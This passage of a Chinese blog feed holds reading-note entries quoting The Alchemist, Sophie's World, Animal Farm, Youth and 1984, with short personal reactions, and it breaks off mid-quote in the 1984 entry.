</li><li>杨戬仰天长啸道：“我出生时，便已然是罪。我父母在一起时，便已然是罪。我与妹妹在世间流浪，我的兄长年少早夭，这都是罪。我已为这罪承担了太多太久，现在，还有多少罪孽，多少天条，不如都拿出来让我犯个痛快！”  </li></ol><h3 id="【11-】-2"><a href="#【11-】-2" class="headerlink" title="【11.】"></a>【11.】</h3><ol><li>那么多座山，像一座座墓碑，每座山下也许都压着一个曾自由的魂灵。  </li></ol><h3 id="【02-】-1"><a href="#【02-】-1" class="headerlink" title="【02.】"></a>【02.】</h3><ol><li>“朋友是什么？”红绫问。<br>“朋友？朋友就是天天在一起玩啊，就是从早到晚一起玩啊，就是晚上睡了觉还想着明天一起玩啊。”  </li></ol><h3 id="【07-】-2"><a href="#【07-】-2" class="headerlink" title="【07.】"></a>【07.】</h3><ol><li>他是天地间的美少年，却面如冷霜。只因他身体里已不再有热血流动，他不过是精美的人偶，再不能感知世间炎凉。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《牧羊少年奇幻之旅》 保罗·柯艾略</title>
      <link href="/2020/reading-note/%E3%80%8A%E7%89%A7%E7%BE%8A%E5%B0%91%E5%B9%B4%E5%A5%87%E5%B9%BB%E4%B9%8B%E6%97%85%E3%80%8B%20%E4%BF%9D%E7%BD%97%C2%B7%E6%9F%AF%E8%89%BE%E7%95%A5/"/>
      <url>/2020/reading-note/%E3%80%8A%E7%89%A7%E7%BE%8A%E5%B0%91%E5%B9%B4%E5%A5%87%E5%B9%BB%E4%B9%8B%E6%97%85%E3%80%8B%20%E4%BF%9D%E7%BD%97%C2%B7%E6%9F%AF%E8%89%BE%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E7%89%A7%E7%BE%8A%E5%B0%91%E5%B9%B4%E5%A5%87%E5%B9%BB%E4%B9%8B%E6%97%85%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="上部"><a href="#上部" class="headerlink" title="上部"></a>上部</h3><ol><li><p>读厚书能消磨更多的时间，夜间当枕头用也更舒服。  </p></li><li><p>以前他多次路过这一带，但从未到过那座教堂。世界广袤无垠，如果他让羊群引领自己走上一段时间，定会发现更多有趣的事情。问题是羊群不会察觉它们每天都在走新路，不会发现草场在变化，四季有区别。因为它们一门心思想着喝水吃草。  </p></li><li><p>恰恰是实现梦想的可能性，才使生活变得有趣。  </p></li><li><p>简单的事情往往最异乎寻常，只有智者才能看透。我不是智者，所以必须有其他的能耐，比如看手相。  </p></li><li><p>在那一带，他认识很多人，这正是他喜欢云游四方的原因，因为总能结交新朋友，而且不必天天跟他们低头不见抬头见。当总是面对同样的面孔，像在神学院里那样，就会渐渐让那些人成为生活的一部分。而由于他们是你生活的一部分，当然就想改变你的生活。如果你不像他们所期望的那样，他们就会不高兴。因为，对于该怎样生活，所有人都有固定的观念。但是他们对于自己该怎样生活却一头雾水，就像那个给人解梦、却不会把梦变成现实的老妇人。  </p></li><li><p>有的时候，最好与羊群为伴，羊群不声不响，只顾吃草喝水。与书为伴也行，书总是在人们最想听故事的时候，告诉你一些意想不到的事情。但是，当人与人交谈的时候，有些人说的话会让我们无所适从，不知该怎样把谈话继续下去。  </p></li><li><p>不论你是谁，不论你做什么，当你渴望得到某种东西时，最终一定能够得到，因为这愿望来自宇宙的灵魂。那就是你在世间的使命。”  </p></li><li><p>但不管怎样，这是件好事，它让你明白了，生活中一切都要付出代价。这正是光明斗士意图教导人们的。  </p></li><li><p>实际上，每天都一成不变，是因为人们已经失去了对美好事物的敏锐感觉。然而，只要有明媚的阳光，人们的生活中就会出现美好的事物。  </p></li><li><p>幸福的秘密就在于，既要看到世上的奇珍异宝，又要永远不忘记勺里的那两滴油。  </p></li><li><p>东西未到手，不应轻易许下诺言。  </p></li><li><p>我和别人没什么两样：总是以理想的眼光看待世界，以为事情会按理想的方式发展，而不会用现实的眼光看待世界，看不到事情真相。他想。  </p></li></ol><h3 id="下部"><a href="#下部" class="headerlink" title="下部"></a>下部</h3><ol><li><p>因为麦加是支撑我活下去的希望，使我能够忍受平庸的岁月，忍受橱柜里那些不会说话的水晶，忍受那间糟糕透顶的餐厅里的午饭和晚饭。我害怕实现我的梦想，实现之后，我就没有活下去的动力了。  </p></li><li><p>“当你想要某种东西时，整个宇宙会合力助你实现愿望。”老迈的撒冷王这样说过。<br>但是，撒冷王却没说过有人会骗取钱财，没说过大沙漠浩瀚无垠，没说过会有知道自己的梦想却不愿去实现的人。撒冷王也没说过金字塔只不过是一个大石头堆，而且谁都可以在自家后院里造一个。还有一件事他也忘记说了：当手上的钱足够买下比原来还要多的羊群时，就应该买下它们。  </p></li><li><p>他对自己作出的决定仍抱有怀疑。但是，他意识到了很重要的一点，那就是，一旦作出决定，实际上便坠入了一股巨大的洪流之中，这洪流会把人带到一个你作决定时从来没想到的地方去。<br>当我决定去寻找宝藏的时候，绝没想到会在一家水晶店打工。  </p></li><li><p>生活中的一切都是预兆。  </p></li><li><p>“如果有能力，我将撰写一部恢弘的百科全书，专门论述‘运气’与‘巧合’这两个词。宇宙的语言就是用这两个词书写的。”  </p></li><li><p>一个人越是接近梦想，天命就越成为他生存下去的真正理由  </p></li><li><p>我从羊群身上学到了东西，从水晶身上学到了东西，他心想。我也能从沙漠身上学到东西。我觉得沙漠更沧桑，更智慧。  </p></li><li><p>男孩明白了，预感就是灵魂飞快地投入生命的洪流当中，世上所有人的经历都在这洪流中联系在一起。我们因此能无所不知，无所不晓，因为一切均已命中注定。  </p></li><li><p>谁也不必担心未知的事情，因为谁都能得到他期望和需要的一切。<br>“我们担心失去的，只是那些我们现在拥有的东西：我们的生命，或我们的作物。但是，当我们明白了生命的历程与世界的历程都是由同一只手写就的时候，这种担心就会消失。”  </p></li><li><p>每个人都有自己的学习方式，他在心中反复对自己说。他的方式不属于我，我的方式也不属于他。但是我们俩都在追寻各自的天命，为此我尊重他。  </p></li><li><p>“因为我既不生活在过去，也不生活在未来，我只有现在，它才是我感兴趣的。如果你能永远停留在现在，那你将是最幸福的人。你会发现沙漠里有生命，发现天空中有星星，发现士兵们打仗是因为战争是人类生活的一部分。生活就是一个节日，是一场盛大的庆典。因为生活永远是，也仅仅是我们现在经历的这一刻。”  </p></li><li><p>“你带左轮手枪干吗？”男孩问。<br>“为了学会信任别人。”英国人回答。现在他很高兴，因为终于来到了他的目的地。  </p></li><li><p>世上总有人在等待着另外一个人，无论是在大沙漠还是在大城市。当这两个人最终相遇，四目相对的时候，过去的一切和将来的一切全都变得无足轻重了，只有眼前的这一刻最重要。还有那不可思议的事实：朗朗乾坤下的一切，都是由同一只手写就  </p></li><li><p>战争一度是一场灾难，可现在它却成了我的福音，因为是战争使我有机会认识你。  </p></li><li><p>一天之中，除去跟法蒂玛一起度过的一刻钟，其余的时间都过得很慢，似乎没有尽头。  </p></li><li><p>“你对我讲了你做的梦、撒冷王，还有你的宝藏。你对我讲了那些预兆。于是我什么都不担心了，因为正是那些预兆把你带到了我面前。我是你梦的一部分，是你常提到的天命的一部分。所以我希望你继续前行，去追寻你的梦想。如果必须等到战争结束，那就等。但是，如果你想提前启程，那就去追寻天命。沙丘会随风改变形状，但沙漠永远存在。我们的爱情也如此。”<br>“马克图布。”她最后说，“如果我是你天命的一部分，总有一天你会回来。  </p></li><li><p>“因为我对沙漠还没习以为常。”男孩回答，“对沙漠熟视无睹的人眼里看不到的东西，我却能够看到。”  </p></li><li><p>武器和沙漠一样变化无常，如果让武器习惯了不用于战斗，下一次它们就懒得发射子弹。如果明天所有的武器都没有机会发射子弹，那么至少会有一种武器朝你身上发射。”  </p></li><li><p>“你必须永不松懈，哪怕已经走了很远的路。”骑士继续说，“你必须热爱沙漠，但是绝不要完全相信沙漠。因为沙漠对所有人都是一个考验：考验你迈出的每一步，杀死心猿意马的人。”  </p></li><li><p>“那么，我为什么要倾听自己的心声呢？”<br>“因为你永远不能让它沉默。即使你佯装不听它的话，它还是会在你的胸膛里，反复倾诉它对生活和世界的看法。”<br>“即使它违背我的意志？”<br>“违背意志是你不希望受到打击。如果你对自己的心非常了解，它就永远打击不到你。因为你将了解它的梦想和愿望，并知道怎样应对。谁也不能逃避自己的心，所以最好倾听心在说什么。只有这样，你才永远不会遭受意外的打击。”  </p></li><li><p>夜色之浓，莫过于黎明前的黑暗。  </p></li><li><p>整个宇宙都在不停发展。”他说，“对智者而言，金子是发展最完善的金属。不要问为什么，因为我也不知道。我只知道传统总是正确的。由于人们没有很好地理解智者的话，结果金子不仅没有被视作发展的象征，反而成了战争的根源。”  </p></li><li><p>不必使铁变得和铜一样，也不必使铜变得和金子一样。每种物质只发挥其作为唯一物的独特作用，万物就会合成一首和平交响乐。  </p></li><li><p>每种事物都有自己的天命，这是真理，但是天命总有一天会完成，于是，就需要转化成更优异的事物，并产生一个新的天命，直到世界之魂真正化为唯一之物。”  </p></li><li><p>“炼金术就是为此诞生的。”男孩说，“其目的是让每个人都寻觅并找到他的财宝，而后力求变得更好，超越以往的自己。铅将履行自己的角色，直到世界不再需要它为止，那时它将不得不变成金子。炼金术士就是干这个的。他们要表明，当我们寻求变得比现在更好的时候，我们周围的一切也将变得更好。”  </p></li><li><p>我是个迷信的阿拉伯老头，我相信自己家乡的一个谚语：所有发生过一次的事，可能永远不会再发生；但所有发生过两次的事，肯定还会发生第三次。”  </p></li><li><p>男孩在前去追寻天命的路途中，学会了必须要学的一切，也经历了梦想经历的一切。  </p></li><li><p>如果你必死无疑，钱对你又有什么用处呢？钱能用来使人免于一死，这种事并不多见。”  </p></li></ol><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><ol><li>生活对追随自己天命的人真的很慷慨  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《苏菲的世界》 乔斯坦·贾德</title>
      <link href="/2020/reading-note/%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%20%E4%B9%94%E6%96%AF%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/"/>
      <url>/2020/reading-note/%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%20%E4%B9%94%E6%96%AF%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="第1章-伊甸园"><a href="#第1章-伊甸园" class="headerlink" title="第1章 伊甸园"></a>第1章 伊甸园</h3><ol><li>唯有清晰地意识到有一天她终将死去，她才能够体会活在世上是多么美好。  </li><li>如果你没有意识到人终将死去，就不能体会活着的滋味。  </li></ol><h3 id="第2章-魔术师的礼帽"><a href="#第2章-魔术师的礼帽" class="headerlink" title="第2章 魔术师的礼帽"></a>第2章 魔术师的礼帽</h3><ol><li>遗憾的是，当我们成长时，不仅习惯了有地心引力这回事，同时也很快地习惯了世上的一切。我们在成长的过程当中，似乎失去了对这世界的好奇心。也正因此，我们丧失了某种极为重要的能力（这也是一种哲学家们想要使人们恢复的能力）。因为，在我们内心的某处，有某个声音告诉我们：生命是一种很庞大的、神秘的存在。这是我们在学会从事这样的思考前都曾经有过的体验。  </li></ol><h3 id="第3章-神话"><a href="#第3章-神话" class="headerlink" title="第3章 神话"></a>第3章 神话</h3><ol><li>不仅挪威神话，几乎所有其他文化都发现善与恶这两种势力之间存在着一种不稳定的平衡。   </li></ol><h3 id="第4章-自然派哲学家"><a href="#第4章-自然派哲学家" class="headerlink" title="第4章 自然派哲学家"></a>第4章 自然派哲学家</h3><ol><li><p>……没有一件事物可以来自空无……  </p></li><li><p>我们最感兴趣的并不是这些早期的哲学家找出了哪些答案，而是他们问了什么问题、寻求何种答案等等。我们对他们的思考方式较感兴趣，而不是他们思考的内容。   </p></li><li><p>赫拉克里特斯指出，世间的事物都是相对的。如果我们从未生病，就不会知道健康的滋味。如果我们从未尝过饥饿的痛苦，我们在饱足时就不会感到愉悦。如果世上从未有过战争，我们就不会珍惜和平。如果没有冬天，春天也不会来临。  </p></li></ol><h3 id="第7章-苏格拉底"><a href="#第7章-苏格拉底" class="headerlink" title="第7章 苏格拉底"></a>第7章 苏格拉底</h3><ol><li>是否有人天生就很害羞呢？<br>最聪明的是明白自己无知的人。<br>真正的智慧来自内心。<br>明辨是非者必能进退合宜。   </li></ol><h3 id="第8章-雅典的哲学"><a href="#第8章-雅典的哲学" class="headerlink" title="第8章 雅典的哲学"></a>第8章 雅典的哲学</h3><ol><li>，世间没有绝对的是非标准，  </li><li>苏格拉底也说：“我只知道一件事，就是我一无所知。”  </li></ol><h3 id="第9章-柏拉图"><a href="#第9章-柏拉图" class="headerlink" title="第9章 柏拉图"></a>第9章 柏拉图</h3><ol><li>苏菲的奶奶曾经说过，她觉得变老的只是自己的身体而已，在内心她一直都还是一个年轻的女孩。  </li><li>她现在眼见的事物没有一样会永远存在。但话说回来，在一百年之后，同样的一些花朵和动物仍然会在这里。虽然每一朵花、每一只动物都会凋萎、死去，而且被世人遗忘，但却有某种东西会“记得”它们从前的模样。  </li></ol><h3 id="第11章-亚里士多德"><a href="#第11章-亚里士多德" class="headerlink" title="第11章 亚里士多德"></a>第11章 亚里士多德</h3><ol><li>亚里士多德认为，快乐有三种形式。一种是过着享乐的生活，一种是做一个自由而负责的公民，另一种则是做一个思想家与哲学家。  </li></ol><h3 id="第12章-希腊文化"><a href="#第12章-希腊文化" class="headerlink" title="第12章 希腊文化"></a>第12章 希腊文化</h3><ol><li>斯多葛学派强调，所有的自然现象，如生病与死亡，都只是遵守大自然不变的法则罢了，因此人必须学习接受自己的命运。  </li><li>“神不足惧，死不足忧，祸苦易忍，福乐易求。”  </li></ol><h3 id="第14章-两种文化"><a href="#第14章-两种文化" class="headerlink" title="第14章 两种文化"></a>第14章 两种文化</h3><ol><li>德国诗人歌德曾经说过：“不能汲取三千年历史经验的人没有未来可言。”  </li></ol><h3 id="第16章-文艺复兴"><a href="#第16章-文艺复兴" class="headerlink" title="第16章 文艺复兴"></a>第16章 文艺复兴</h3><ol><li>“我们不能让自己被历史的浪潮冲走，总得有人收拾河岸边留下来的东西。”  </li><li>生命本来就是悲伤而严肃的。我们来到这个美好的世界里，彼此相逢，彼此问候，并结伴同游一段短暂的时间。然后我们就失去了对方，并且莫名其妙就消失了，就像我们突然莫名其妙地来到世上一般。  </li><li>他们认为：‘马生下来就是马，但人要作为一个人，还需要靠后天慢慢地培养。’”<br> “我们一定要受教育才可以成为一个人吗？”  </li><li>没有任何一个时代是完全好或完全坏的。善恶乃是人类历史中不时交织在一起的两股线。  </li></ol><h3 id="第18章-笛卡尔"><a href="#第18章-笛卡尔" class="headerlink" title="第18章 笛卡尔"></a>第18章 笛卡尔</h3><ol><li>有一件事情必定是真实的，那就是他怀疑。当他怀疑时，他必然是在思考，而由于他在思考，那么他必定是个会思考的存在者。用他自己的话来说，就是：Cogito，ergosum。”<br> “什么意思？”<br> “我思故我在。”  </li><li>所以思想有能力超脱身体的需求，而做出‘合乎理性’的行为，从这个角度来看，灵魂要比身体高尚。我们的腿可能会衰老无力，我们的背可能变驼，我们的牙齿会掉，但只要我们的理性存在一天，二加二就永远是四。理性不会变驼、变弱。老化的是我们的身体。  </li><li>“照道理，承认自己不知道乃是获得新知识的一步。”  </li></ol><h3 id="第19章-斯宾诺莎"><a href="#第19章-斯宾诺莎" class="headerlink" title="第19章 斯宾诺莎"></a>第19章 斯宾诺莎</h3><ol><li>我们的发展与个人的成长可能会受到政治环境等因素的阻碍，外在的环境可能限制我们，只有在我们能够‘自由’发展本身固有能力时，我们才活得像个自由的人。但无论如何，我们仍然像那个生长在石器时代莱茵河谷的男孩、那只非洲的狮子或花园里那棵苹果树一样受到内在潜能与外在机会的左右。”  </li></ol><h3 id="第21章-休姆"><a href="#第21章-休姆" class="headerlink" title="第21章 休姆"></a>第21章 休姆</h3><ol><li>“每一次我察觉到人家有偏见的时候，感觉都很不好。”<br> “休姆谈到习惯对人的影响时，强调所谓的‘因果法则’，也就是说每一件事的发生必有其原因。  </li><li>一件事情跟着另外一件事情发生，并不一定表示两者之间必有关联。哲学的目的之一就是教人们不要妄下定论。因为，妄下定论可能会导致许多迷信。  </li></ol><h3 id="第22章-柏克莱"><a href="#第22章-柏克莱" class="headerlink" title="第22章 柏克莱"></a>第22章 柏克莱</h3><ol><li>柏克莱相信人有‘灵’。他认为我们所有的观念都有一个我们意识不到的成因。但这个成因不是物质的，而是精神性的。  </li></ol><h3 id="第23章-柏客来"><a href="#第23章-柏客来" class="headerlink" title="第23章 柏客来"></a>第23章 柏客来</h3><ol><li>真实启蒙之于人<br> 如同阳光之于土  </li><li>“灵魂渴望乘着爱的翅膀回‘家’，回到理型的世界中。它渴望自肉体的枷锁……”  </li><li>世间存在的每一样事物都有这种神秘的神圣之光。我们可以看到它在向日葵或罂粟花中闪烁着光芒。在一只飞离枝头的蝴蝶或在水缸中优游穿梭的金鱼身上，我们可以看到更多这种深不可测的神秘之光。然而，最靠近上帝的还是我们的灵魂。唯有在灵魂中，我们才能与生命的伟大与神秘合而为一。事实上，在某些很偶然的时刻中，我们可以体验到自我就是那神圣的神秘之光。  </li><li>她喜欢那段引自歌德的文字：“不能汲取三千年历史经验的人没有未来可言。”  </li></ol><h3 id="第24章-启蒙"><a href="#第24章-启蒙" class="headerlink" title="第24章 启蒙"></a>第24章 启蒙</h3><ol><li>这是一个真正的哲学家最崇高的美德。苏菲，我真是以你为荣。你在这么短的时间内就学到了这么多。”<br> “我怕没有一件事情是真的。”<br> “这种感觉叫做‘存在的焦虑’。通常只是在迈向获得新意识的过程中的一个阶段而已。”   </li></ol><h3 id="第25章-康德"><a href="#第25章-康德" class="headerlink" title="第25章 康德"></a>第25章 康德</h3><ol><li>康德的概念是：时间与空间属于人类的条件。时、空乃是人类感知的方式，并非物质世界的属性。  </li><li>如果人类的脑袋简单得足以让我们了解的话，我们还是会愚笨得无法理解它。  </li><li>认为辨别是非的能力是天生就存在于人的理性中的。每一个人都知道何谓是、何谓非。这并不是后天学来的，而是人心固有的观念。根据康德的看法，每一个人都有‘实践理性’，也就是说每个人都有辨别是非的智慧。  </li><li>你的行为是否合乎德正取决于你是否出自善意而为之，并不取决于你的行为后果。因此康德的伦理学有时也被称为善意的伦理学。  </li><li>但是，只有我们自己确知我们纯粹是为了遵守道德法则而行动时，我们的行为才是自由的。  </li><li>“所以当你选择不要对别人不好时——即使这样会违反你自己的利益——你就是在从事自由的行为。”<br>“而如果你只是做自己想做的事，你就不算自由或独立。”<br>“我们可能会成为各种事物的奴隶，我们甚至可能成为我们的自我中心思想的奴隶。独立与自由正是我们超脱自我的欲望与恶念的方法。”   </li><li>哲学是童话故事的相反。  </li></ol><h3 id="第26章-浪漫主义"><a href="#第26章-浪漫主义" class="headerlink" title="第26章 浪漫主义"></a>第26章 浪漫主义</h3><ol><li>曾有人说：‘闲散是天才的理想，懒惰是浪漫主义者的美德。’浪漫主义者的职责就是体验生活——或是成天做白日梦、浪费生命。至于日常的事务留给那些俗人做就行了。  </li></ol><h3 id="第27章-黑格尔"><a href="#第27章-黑格尔" class="headerlink" title="第27章 黑格尔"></a>第27章 黑格尔</h3><ol><li>可以说一种意见如果能受到激烈的反对，那是再好不过的事。因为反对者愈极端，他们所激发的反应也就愈强。有人说这是‘谷子愈多，磨坊就磨得愈起劲’  </li></ol><h3 id="第29章-马克思"><a href="#第29章-马克思" class="headerlink" title="第29章 马克思"></a>第29章 马克思</h3><ol><li>马克思更进一步强调说：一个社会的是非标准主要是由那个社会里的统治阶级来决定的，因为‘人类社会的历史就是一部阶级斗争史’。换句话说，历史所牵涉的主要就是一个谁拥有生产工具的问题。  </li></ol><h3 id="第31章-佛洛伊德"><a href="#第31章-佛洛伊德" class="headerlink" title="第31章 佛洛伊德"></a>第31章 佛洛伊德</h3><ol><li>苏菲，我们就是这个活的星球。地球是航行在宇宙中燃烧的太阳四周的一艘大船。而我们每一个人则是满载基因航行过生命的一条小船。当我们安全地把船上的货品运到下一个港口时，我们就没有白活了……  </li><li>佛洛伊德相信梦境乃是‘以伪装的方式满足人被压抑的愿望’。  </li><li>如果我们在睡眠的各个阶段受到打扰，我们就会变得烦躁易怒。这正表示每一个人内心都需要以艺术的形式来表达他或她存在的情况。  </li></ol><h3 id="第33章-花园宴会"><a href="#第33章-花园宴会" class="headerlink" title="第33章 花园宴会"></a>第33章 花园宴会</h3><ol><li>要有批判性的思考态度。黑格尔称之为否定的思考。  </li></ol><h3 id="第35章-那轰然一响"><a href="#第35章-那轰然一响" class="headerlink" title="第35章 那轰然一响"></a>第35章 那轰然一响</h3><ol><li>所以说当我们仰望天空时，我们其实是在试图找寻回到自我的路。”  </li></ol><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>挺不错的一本哲学入门书。<br>不仅是看的时候有哲学的知识科普，更重要的是，这本书本身的故事就能让人进行深刻的哲学思考。<br>一个亘古不变的问题。<br>为什么会有这个世界，这个世界是真的还是另一个世界的一个游戏/书籍/电影里的故事。<br>这本书是真的棒啊  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《动物农场》 作者：乔治·奥威尔</title>
      <link href="/2020/reading-note/%E3%80%8A%E5%8A%A8%E7%89%A9%E5%86%9C%E5%9C%BA%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/"/>
      <url>/2020/reading-note/%E3%80%8A%E5%8A%A8%E7%89%A9%E5%86%9C%E5%9C%BA%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E5%8A%A8%E7%89%A9%E5%86%9C%E5%9C%BA%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>：  <p>1.生活会继续下去的，一如既往，也就是说总有不足之处。   </p><h3 id="第9章"><a href="#第9章" class="headerlink" title="第9章"></a>第9章</h3><ol><li>当年他们为推翻人类而斗争，他们追求的目标可不是今天这样的景象。这些恐怖和屠杀的场面绝不是那天夜里老少校第一次鼓动他们造反时大家所向往的。对于未来，如果说她还曾有过什么构想，那就一定是构想了这样一个社会：在那里，没有饥饿和鞭子的折磨，一律平等，各尽其能，强者保护弱者，就像是在少校讲演的那天晚上，她曾经用前腿保护着那些最后才到的一群小鸭子一样。但现在她不明白，为什么他们现在竟处在一个不敢讲真话的世界里。当那些气势汹汹的狗到处咆哮的时候，当眼看着自己的同志在坦白了可怕的罪行后被撕成碎片而无可奈何的时候……  </li></ol><h3 id="第10章"><a href="#第10章" class="headerlink" title="第10章"></a>第10章</h3><ol><li>在农场里，把每遇到一件幸运之事，每取得一项成就的荣誉归于拿破仑已成了家常便饭。你会常常听到一只鸡对另一只鸡这样讲道：“在我们的领袖拿破仑的指引下，我在六天之内下了五只蛋。”或者两头正在饮水的牛声称：“多亏拿破仑同志的领导，这水喝起来真甜！”  </li><li>动物们现在还得知，和他们一直想象的情况正相反，斯诺鲍从来都没有受到过“一级动物英雄”嘉奖。受奖的事只不过是在牛棚大战后，斯诺鲍自己散布的一个神话。根本就没有给他授勋这回事，倒是因为他在战斗中表现怯懦而早就受到谴责。有些动物又一次感到不好接受，但斯奎拉很快就使他们相信是他们记错了。  </li><li>斯奎拉说，拿破仑思想上的卓越之处，实际上就体现在他对任何人都不信任上，即使对弗雷德里克也是如此。  </li></ol><h3 id="第12章"><a href="#第12章" class="headerlink" title="第12章"></a>第12章</h3><ol><li>斯奎拉解释说，在定量上过于教条的平等是违背动物主义原则的。  </li><li>他们知道，近来的生活窘困而艰难，常常是饥寒交迫，醒着的时候就是干活，但毫无疑问，过去更糟糕。他们情愿相信这些。再说，那时他们是奴隶，现在却享有自由。  </li><li>但有一件难以判断的事是，那些猪对待摩西是什么态度呢？他们都轻蔑地称他那些关于糖果山的说法全是谎言，可是仍然允许他留在农场里，不参加劳动，每天还领取四分之一品脱的啤酒津贴。  </li></ol><h3 id="第14章"><a href="#第14章" class="headerlink" title="第14章"></a>第14章</h3><ol><li>当年谈论风车时，斯诺鲍引导动物们所想象的那种享受不尽的舒适，那种带电灯和冷热水的窝棚，那种每周三天工作制，如今不再谈论了。拿破仑早就斥责说，这些想法是与动物主义的精神背道而驰的。他说，最纯粹的幸福在于工作勤奋和生活俭朴。<br> 不知道为什么，反正看上去，农场似乎已经变得富裕了，但动物们自己一点都没有变富，当然猪和狗要排除在外。  </li><li>还说他认识到事物过去没有，将来也不会有什么更好或更糟之分。因此他说，饥饿、艰难、失望的现实，是生活不可改变的规律。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《芳华》 严歌苓</title>
      <link href="/2020/reading-note/%E3%80%8A%E8%8A%B3%E5%8D%8E%E3%80%8B%20%E4%B8%A5%E6%AD%8C%E8%8B%93/"/>
      <url>/2020/reading-note/%E3%80%8A%E8%8A%B3%E5%8D%8E%E3%80%8B%20%E4%B8%A5%E6%AD%8C%E8%8B%93/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E8%8A%B3%E5%8D%8E%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>：  <ol><li>人之所以为人，就是他有着令人憎恨也令人热爱、令人发笑也令人悲悯的人性。  </li><li>“你不爱他，是你的权利，他爱你，是他的权利。但你没权利出卖他。  </li><li>放下了包袱，破碎了梦想，就是那种笑。笑我们曾经认真过的所有事。前头没有值得期盼的好事，身后也没有留下值得自豪的以往，就是无价值的流年，也所剩不多，明明破罐子，也破摔不起，摔了连破的都没了，那种笑。就是热诚情愿邀请人家摸，也没人摸了，既然最终没人摸，当时吝啬什么？反正最终要残剩，最终是狗剩儿，当时神圣什么？对，就那种笑。  </li><li>国家这么大，跟一个大工厂似的，产品总得改换，机器也总得更新，咱们就算是些老机器老零件，老螺丝钉，给换下来了，扔了，不换不扔工厂就得关门。不是好些工厂都关了门？工人不都得下岗？咱打完仗也就下岗了。哪个国家都一样，当兵的嘛，仗打完了就都是换下来的废零件，旧螺丝钉。  </li></ol><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>我没啥感觉，不是很喜欢这本书  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《1984》 乔治·奥威尔</title>
      <link href="/2020/reading-note/%E3%80%8A1984%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/"/>
      <url>/2020/reading-note/%E3%80%8A1984%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A1984%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol><li>你说的每一句话，发出的每一个声响都会被监听；只要有一点光线，你的一举一动都会被监视。这便是生活，你身处其中，且无从选择。</li><li>在这个充斥着谎言的世界里，只有他捍卫着真理和理智。</li><li>过去尽管说是可以改变的，却从未被改变过。只要是真实的东西，就永远都是真实的。</li><li>知道的同时一无所知；无比诚实地说着精心编织的谎言；理所当然地同时持有两种观点，哪怕深知这两种观点互相矛盾，却仍然全盘接受；用逻辑驳斥逻辑；批驳道德的同时却又声称自己是道德的；相信民主不可能实现的同时相信党捍卫着民主；在应该忘记的时候忘记，在需要的时候再记起，接着又立即将其忘记，最重要的是，将方法运用于方法本身。这便是极微妙之处：有意识地将自己催眠，接着将刚才自我催眠这件事也忘掉。哪怕理解“双向思维”这个词，都要用到双向思维。</li><li>使得过去每一天，几乎每时每刻都与现在保持一致，通过这种方式，使得资料显示的党的每一项预测都是正确的，不允许任何与当下情形相违背的新闻报道和观点的记录存在。所有历史事件就像写在一张可以擦去重写的羊皮纸上。只要有这个必要，就会立刻把原文擦得一干二净，重新书写。因此只要这么做，就绝没有可能证明有错误的存在。</li><li>可什么又能表明这不该是世界应有的样子呢？如果根本没有任何久远的记忆显示世界曾经并非如此，又有什么理由感到无法忍受呢？</li><li>如果有希望，那么希望就在群众身上。</li><li>他们不觉悟，就永远不会反抗；而不反抗，他们就无法觉悟。</li><li>群众有着强烈的政治倾向并不是一件可取的事。他们只需具备最原始的爱国主义情感即可。这样，就能在需要时唤起这种情感，让他们接受更长的工作时间和更少的物资配给。哪怕他们变得有所不满——有时候他们的确会这样——他们的不满也不会导致任何结果。因为缺少